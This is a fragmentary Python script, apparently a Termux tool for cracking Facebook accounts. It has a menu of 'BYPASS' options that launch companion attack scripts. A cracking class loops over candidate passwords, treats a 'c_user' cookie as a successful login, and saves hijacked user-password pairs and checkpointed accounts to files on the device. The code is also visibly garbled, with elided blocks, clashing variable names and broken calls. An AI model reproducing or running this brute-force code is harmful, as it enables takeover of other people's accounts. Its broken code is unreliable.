...
def R():
			os.system("clear")
			logo()
			print("        \033[1;92m 𝙱𝚈𝙿𝙰𝚂𝚂𝙴𝙳 𝙱𝚈 𝙰𝙻𝙴𝚇 𝙱𝙾𝚈 + 𝙳𝙸𝙽𝙾 𝙺𝙸𝙽𝙶 😎 \033[1;97m")
			print("          \033[1;92m 𝚁𝙰𝙼𝚉𝙰𝙽 𝙺𝙴 𝙰𝙺𝙺 𝙲𝙷𝙾𝚃𝙴 𝚂𝙴 𝙶𝙸𝙵𝚃 ❣️ \033[1;97m")
			print (' [🔥]⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑⌑')
			print(" [01]\033[1;32m 𝙱𝚈𝙿𝙰𝚂𝚂\033[1;32m    [𝚀𝙰𝙸𝚂𝙴𝚁]  ")
			print(" [02]\033[1;32m 𝙱𝚈𝙿𝙰𝚂𝚂\033[1;33m    [𝚀𝙰𝙳𝙸𝚁]  ")
			print(" [03]\033[1;32m 𝙱𝚈𝙿𝙰𝚂𝚂\033[1;34m    [𝚂𝚂𝙱]  ")
			print(" [04]\033[1;32m 𝙱𝚈𝙿𝙰𝚂𝚂\033[1;31m    [𝙰𝙳𝙵]  ")
			print(" [05]\033[1;32m 𝙱𝚈𝙿𝙰𝚂𝚂\033[1;35m    [𝙱𝚂𝙽]  ")
			print(" [06]\033[1;32m 𝙱𝚈𝙿𝙰𝚂𝚂\033[1;36m    [𝙰𝙺𝙸𝙽𝙶]  ")
			print(" [07]\033[1;32m 𝙱𝚈𝙿𝙰𝚂𝚂\033[1;37m    [𝚂𝙾𝙼𝙸]  ")
			print(" [08]\033[1;32m 𝙱𝚈𝙿𝙰𝚂𝚂\033[1;38m    [𝚉𝙰𝙷𝙸𝙳]  ")
			print(" [09]\033[1;32m 𝙱𝚈𝙿𝙰𝚂𝚂\033[1;34m    [𝙹𝙰𝙼𝙴𝚂]  ")
			print(" [10]\033[1;32m 𝙱𝚈𝙿𝙰𝚂𝚂\033[1;96m    [𝚂𝚄𝙱𝙷𝙰𝙽]  ")
			print(" [11]\033[1;32m 𝙱𝚈𝙿𝙰𝚂𝚂\033[1;38m    [𝚉𝚄𝙱𝙸]")
			print(" [12]\033[1;32m 𝙱𝚈𝙿𝙰𝚂𝚂\033[1;33m    [𝙰𝙳𝙸-𝙿𝙰𝙸𝙳]  ")
			print(" [13]\033[1;32m 𝙱𝚈𝙿𝙰𝚂𝚂\033[1;34m    [𝙰𝙱𝙳𝚄𝙻𝙻𝙰𝙷\033[1;37m]  ")
			...
			if key in [""]:
				...
				os.system("python Fuck_SSB.py")
			elif key in ["4", "04"]:
				os.system("python Fuck_Adf.py")
			elif key in ["5", "05"]:
			    os.system("python Fuck_Bsn.py")
			elif key in ["6", "06" ]:
				os.system("python AKING.py")
			elif key in ["7", "07" ]:
				os.system("python Fuck_Somi.py")
			elif key in ["8", "08" ]:
				os.system("python Fuck_Zahid.py")
			elif key in ["9", "09" ]:
				os.system("python Fuck_James.py")
			elif key in ["10"]:
				os.system("python Fuck_Subhan.py")
			elif key in ["11"]:
				os.system("python Fuck_Zubair.py")
			elif key in ["12"]:
				os.system("python Fuck_Adi.py")
			elif key in ["13"]:
				os.system("python Fuck_Abdullah.py")
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;35m [AKING] \033[1;32m%s/%s  \033[1;92mOK-:%s  '%(loop,len(self.id),len(ok))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[Successful-AKING] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/AKING_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      ' % (usr,p,day,mnth,yar,tahn(uer)))
					wrt = '%s - %s - %s %s %s%s' % (ser,p,dy,moth,yer,thun(usr))
					cp.append(wrt)
					...
					pass
				print('\r\033[1;91m[Checkpoint-AKING] %s | %s%s      ' % (ser,w,thun(ser)))
				wrt = '%s - %s%s'%(uer,p,taun(usler))
				cp.append(wrt)
				open('/sdcard/AKING_CP.txt','a').write('%s\n' % wrt)
				break
			else:
